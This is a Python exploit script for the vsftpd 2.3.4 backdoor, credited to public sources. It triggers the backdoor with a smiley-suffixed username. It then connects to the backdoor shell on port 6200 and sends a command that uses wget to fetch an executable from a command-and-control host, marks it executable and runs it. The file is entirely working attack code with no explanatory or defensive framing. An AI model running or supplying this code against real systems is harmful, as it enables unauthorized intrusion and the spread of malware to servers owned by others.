# vsftpd_234_exploit.py
# reference & credit: https://github.com/ahervias77/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py, https://0x00sec.org/t/re-building-a-vsftpd-backdoor-exploit-in-python/159
import socket
import sys
import time
import random
import string

def exploit(ip, port,cnc_ip,executable):
		
    try:
        ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_socket.settimeout(5)
        ftp_socket.connect((ip, port))
	
        username = "USER " + ''.join(random.sample(string.ascii_letters,4))+":)"+"\r\n"
        byte_username = username.encode('utf-8')
        ftp_socket.send(byte_username)

        password = "PASS " + ''.join(random.sample(string.ascii_letters,4)) + '\r\n'
        byte_password = password.encode('utf-8')
        ftp_socket.send(byte_password)
        time.sleep(2)
        ftp_socket.close()

    except Exception as e:
        return False
    try:
        backdoor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_socket.settimeout(5)
        backdoor_socket.connect((ip, 6200))
        command = "wget http://%s/%s; chmod 777 %s; ./%s" % (cnc_ip,executable,executable,executable)
        command = str.encode(command + '\n')
        backdoor_socket.send(command)
        response = backdoor_socket.recv(1024).decode('utf-8')
        backdoor_socket.close()
        return True
	
    except Exception as e:
        return False
